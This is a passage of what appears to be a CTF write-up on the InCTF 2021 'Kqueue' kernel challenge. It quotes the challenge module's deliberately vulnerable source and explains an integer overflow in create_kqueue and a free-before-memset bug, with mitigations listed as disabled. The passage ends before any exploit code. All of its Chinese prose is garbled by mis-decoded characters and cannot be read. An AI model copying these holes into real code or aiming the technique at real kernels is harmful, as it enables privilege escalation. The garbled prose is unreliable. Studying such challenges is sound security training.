<p>åŸé¢˜ä¸‹è½½åœ°å€åœ¨<a target="_blank" rel="noopener" href="https://github.com/teambi0s/InCTFi/tree/master/2021/Pwn/Kqueue">è¿™é‡Œ</a>ï¼Œæœ¬ç¯‡ wp å‚ç…§äº† <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269031.htm">Scupax0s å¸ˆå‚…çš„ WP</a></p>
<p>è¿™é“é¢˜çš„æ–‡ä»¶ç³»ç»Ÿç”¨ Buildroot è¿›è¡Œæ„å»ºï¼Œ<strong>ç™»å…¥ç”¨æˆ·åä¸º ctfï¼Œå¯†ç ä¸º kqueue</strong>ï¼Œç¬”è€…æ‰¾äº†åŠå¤©æ‰åœ¨å®˜æ–¹ GitHub é‡Œçš„ Admin ä¸­æ‰“è¿œç¨‹ç”¨çš„è„šæœ¬æ‰¾åˆ°çš„è¿™ä¸ªä¿¡æ¯â€¦</p>
<p>è¿˜æœ‰ä¸ªåŸå› ä¸æ˜çš„é—®é¢˜ï¼Œæœ¬åœ°é‡æ‰“åŒ…å<strong>è¿è¡Œæ ¹ç›®å½•ä¸‹ init æ—¶çš„ euid ä¸º 1000</strong>ï¼Œç¬”è€…åªå¥½æ‹‰ä¸€ä¸ªåˆ«çš„ kernel pwn çš„æ–‡ä»¶ç³»ç»Ÿè¿‡æ¥æš‚æ—¶é¡¶ç”¨â€¦</p>
</blockquote>
<h3 id="â‘ -ä¿æŠ¤åˆ†æ"><a href="#â‘ -ä¿æŠ¤åˆ†æ" class="headerlink" title="â‘  ä¿æŠ¤åˆ†æ"></a>â‘  ä¿æŠ¤åˆ†æ</h3><p>æŸ¥çœ‹å¯åŠ¨è„šæœ¬ï¼Œåªå¼€å¯äº† kaslr ä¿æŠ¤ï¼Œæ²¡å¼€ KPTI ä¹Ÿæ²¡å¼€ smap&amp;smepï¼Œè¿˜æ˜¯ç»™äº†æˆ‘ä»¬ ret2usr çš„æœºä¼šçš„</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">exec</span> qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel <span class="hljs-string">&quot;bzImage&quot;</span> \<br>    -append <span class="hljs-string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \<br>    -monitor /dev/null \<br>    -initrd <span class="hljs-string">&quot;./rootfs.cpio&quot;</span> \<br>    -net user \<br>    -net nic<br></code></pre></td></tr></table></figure>

<h3 id="â‘¡-æºç åˆ†æ"><a href="#â‘¡-æºç åˆ†æ" class="headerlink" title="â‘¡ æºç åˆ†æ"></a>â‘¡ æºç åˆ†æ</h3><p>é¢˜ç›®ç»™å‡ºäº†æºä»£ç ï¼Œå…å»äº†æˆ‘ä»¬é€†å‘çš„éº»çƒ¦</p>
<blockquote>
<p>ä½†æœ‰çš„æ—¶å€™ç»™å‡ºæºç åè€Œä¼šå¢å¤§è§£é¢˜éš¾åº¦ï¼Œæ¯”å¦‚è¯´ *CTF2021 çš„ babygame <del>C++ PWNèƒ½ä¸èƒ½çˆªå·´</del></p>
</blockquote>
<p>åœ¨ <code>kqueue.h</code> ä¸­åªå®šä¹‰äº†ä¸€ä¸ª ioctl å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">kqueue_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>;<br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">kqueue_fops</span> =</span> &#123;.unlocked_ioctl = kqueue_ioctl&#125;;<br></code></pre></td></tr></table></figure>

<p>ioctl çš„å‡½æ•°å®šä¹‰ä½äº <code>kqueue.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">kqueue_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>&#123;<br><br>    <span class="hljs-type">long</span> result;<br><br>    <span class="hljs-type">request_t</span> request;<br><br>    mutex_lock(&amp;operations_lock);<br><br>    <span class="hljs-keyword">if</span> (copy_from_user((<span class="hljs-type">void</span> *)&amp;request, (<span class="hljs-type">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">request_t</span>)))&#123;<br>        err(<span class="hljs-string">&quot;[-] copy_from_user failed&quot;</span>);<br>        <span class="hljs-keyword">goto</span> ret;<br>    &#125;<br><br>    <span class="hljs-keyword">switch</span>(cmd)&#123;<br>        <span class="hljs-keyword">case</span> CREATE_KQUEUE:<br>            result = create_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DELETE_KQUEUE:<br>            result = delete_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EDIT_KQUEUE:<br>            result = edit_kqueue(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SAVE:<br>            result = save_kqueue_entries(request);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            result = INVALID;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>ret: <br>    mutex_unlock(&amp;operations_lock);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¦ä¼ å…¥çš„ç»“æ„ä½“åº”å½“ä¸º <code>request_t</code> ç±»å‹ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br></code></pre></td></tr></table></figure>

<p>åœ¨ ioctl ä¸­å®šä¹‰äº†æ¯”è¾ƒç»å…¸çš„å¢åˆ æ”¹æŸ¥æ“çºµï¼Œä¸‹é¢é€ä¸ªåˆ†æ</p>
<h4 id="err"><a href="#err" class="headerlink" title="*err"></a><em>*err</em></h4><p>ç¬”è€…å‘ç°åœ¨å…¶å®šä¹‰çš„ä¸€ç³»åˆ—å‡½æ•°å½“ä¸­éƒ½æœ‰ä¸€ç³»åˆ—çš„æ£€æŸ¥ï¼Œè‹¥æ£€æŸ¥ä¸é€šè¿‡åˆ™ä¼šè°ƒç”¨ <code>err</code> å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´<strong>æ‰€æœ‰çš„æ£€æŸ¥æ²¡æœ‰ä»»ä½•çš„å®é™…æ„ä¹‰ï¼Œå“ªæ€•ä¸é€šè¿‡æ£€æŸ¥ä¹Ÿä¸ä¼šé˜»ç¢ç¨‹åºçš„è¿è¡Œ</strong>ï¼Œç»ç¬”è€…å®æµ‹ç¡®ä¹å¦‚æ­¤</p>
<h4 id="create-kqueue"><a href="#create-kqueue" class="headerlink" title="create_kqueue"></a>create_kqueue</h4><p>ä¸»è¦æ˜¯è¿›è¡Œé˜Ÿåˆ—çš„åˆ›å»ºï¼Œé™åˆ¶äº†é˜Ÿåˆ—æ•°é‡ä¸å¤§å°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-type">long</span> result = INVALID;<br><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><br>    <span class="hljs-comment">/* You can&#x27;t ask for 0 queues , how meaningless */</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><br>    <span class="hljs-comment">/* Asking for too much is also not good */</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br><br>    <span class="hljs-comment">/* Initialize kqueue_entry structure */</span><br>    queue_entry *kqueue_entry;<br><br>    <span class="hljs-comment">/* Check if multiplication of 2 64 bit integers results in overflow */</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Size is the size of queue structure + size of entry * request entries */</span><br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><br>    <span class="hljs-comment">/* Total size should not exceed a certain limit */</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br>    <span class="hljs-comment">/* All checks done , now call kzalloc */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-type">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Main queue can also store data */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br><br>    <span class="hljs-comment">/* Fill the remaining queue structure */</span><br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br><br>    <span class="hljs-comment">/* Get to the place from where memory has to be handled */</span><br>    kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br><br>    <span class="hljs-comment">/* Allocate all kqueue entries */</span><br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><br>    <span class="hljs-comment">/* Find an appropriate slot in kqueues */</span><br>    <span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ä¸€ä¸ª queue ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œå¤§å°ä¸º 0x18ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æœ‰ä¸€ä¸ªå…¨å±€æŒ‡é’ˆæ•°ç»„ä¿å­˜åˆ†é…çš„ queue</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œç”¨åˆ°äº† <a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc/Integer-Overflow-Builtins.html">gcc å†…ç½®å‡½æ•°</a> <code>__builtin_umulll_overflow</code>ï¼Œä¸»è¦ä½œç”¨å°±æ˜¯å°†å‰ä¸¤ä¸ªå‚æ•°ç›¸ä¹˜ç»™åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‘ç”Ÿæº¢å‡ºåˆ™è¿”å› trueï¼Œ<code>__builtin_saddll_overflow</code> ä¸ä¹‹ç±»ä¼¼ä¸è¿‡æ˜¯åŠ æ³•</p>
<p>é‚£ä¹ˆè¿™é‡Œè™½ç„¶ queue ç»“æ„ä½“çš„æˆå‘˜æ•°é‡ä¼¼ä¹æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯åœ¨ kmalloc æ—¶ä¼ å…¥çš„ size ä¸º <code>((request.max_entry + 1) * sizeof(queue_entry)) + sizeof(queue)</code>ï¼Œå…¶å‰©ä½™çš„ç©ºé—´ç”¨ä½œ queue_entry ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> idx;<br>    <span class="hljs-type">char</span> *data;<br>    queue_entry *next;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œå­˜åœ¨ä¸€ä¸ª<strong>æ•´å‹æº¢å‡ºæ¼æ´</strong>ï¼šå¦‚æœåœ¨ <code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code> ä¸­æˆ‘ä»¬ä¼ å…¥çš„ <code>request.max_entries</code> ä¸º <code>0xffffffff</code>ï¼ŒåŠ ä¸€åå˜ä¸º0ï¼Œæ­¤æ—¶ä¾¿èƒ½é€šè¿‡æ£€æµ‹ï¼Œä½† space æœ€ç»ˆçš„ç»“æœä¸º0ï¼Œä»è€Œåœ¨åç»­è¿›è¡Œ kmalloc æ—¶ä¾¿åªåˆ†é…äº†ä¸€ä¸ª queue çš„å¤§å°ï¼Œä½†æ˜¯å­˜æ”¾åˆ° queue çš„ max_entries åŸŸçš„å€¼ä¸º <code>request.max_entries</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br><span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br><span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªç§»åŠ¨æŒ‡é’ˆçš„ä»£ç çœ‹å¾—ç¬”è€…æ¯”è¾ƒç–‘æƒ‘ï¼Œå› ä¸ºåœ¨ç¬”è€…çœ‹æ¥å¯ä»¥ç›´æ¥å†™ä½œ <code>(queue_entry *)(queue + 1)</code>ï¼Œ<del>ä¸è¿‡é˜¿ä¸‰çš„ä»£ç æ‡‚çš„éƒ½æ‡‚</del></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br></code></pre></td></tr></table></figure>

<p>åœ¨åˆ†é… queue-&gt;data æ—¶ç»™ kmalloc ä¼ å…¥çš„å¤§å°ä¸º <code>request.data_size</code>ï¼Œé™åˆ¶ä¸º 0x20</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ä¼šä¸ºæ¯ä¸€ä¸ª queue_entry çš„ data åŸŸéƒ½åˆ†é…ä¸€å—å†…å­˜ï¼Œå¤§å°ä¸º <code>request.data_size</code>ï¼Œä¸” queue_entry ä»ä½åœ°å€å‘é«˜åœ°å€è¿æ¥æˆä¸€ä¸ªå•å‘é“¾è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br><br>        <span class="hljs-comment">/* Increment current_entry by size of queue_entry */</span><br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br><br>        <span class="hljs-comment">/* Populate next pointer of the previous entry */</span><br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>åœ¨æœ€åä¼šåœ¨ kqueue æ•°ç»„ä¸­æ‰¾ä¸€ä¸ªç©ºçš„ä½ç½®æŠŠåˆ†é…çš„ queue æŒ‡é’ˆæ”¾è¿›å»</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>    <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>    err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br><br><span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>kqueues[j] = <span class="hljs-built_in">queue</span>;<br>queueCount++;<br>result = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure>

<h4 id="delete-kqueue"><a href="#delete-kqueue" class="headerlink" title="delete_kqueue"></a>delete_kqueue</h4><p>å¸¸è§„çš„åˆ é™¤åŠŸèƒ½ï¼Œä¸è¿‡è¿™é‡Œæœ‰ä¸ª bug æ˜¯å…ˆé‡Šæ”¾åå†æ¸…é›¶ï¼Œç¬”è€…è®¤ä¸ºä¼šæŠŠ free object çš„next æŒ‡é’ˆç»™æ¸…æ‰ï¼Œæœ‰å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ï¼Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">delete_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-comment">/* Check for out of bounds requests */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check for existence of the request kqueue */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] Requested kqueue does not exist&quot;</span>);<br><br>    kfree(<span class="hljs-built_in">queue</span>);<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">queue</span>,<span class="hljs-number">0</span>,<span class="hljs-built_in">queue</span>-&gt;queue_size);<br>    kqueues[request.queue_idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="edit-kqueue"><a href="#edit-kqueue" class="headerlink" title="edit_kqueue"></a>edit_kqueue</h4><p>ä¸»è¦æ˜¯ä»ç”¨æˆ·ç©ºé—´æ‹·è´æ•°æ®åˆ°æŒ‡å®š queue_entry-&gt;sizeï¼Œå¦‚æœç»™çš„ entry_idxä¸º 0 åˆ™æ‹·åˆ° queue-&gt;data</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">edit_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-comment">/* Check the idx of the kqueue */</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br><br>    <span class="hljs-comment">/* Check if the kqueue exists at that idx */</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = kqueues[request.queue_idx];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">queue</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue does not 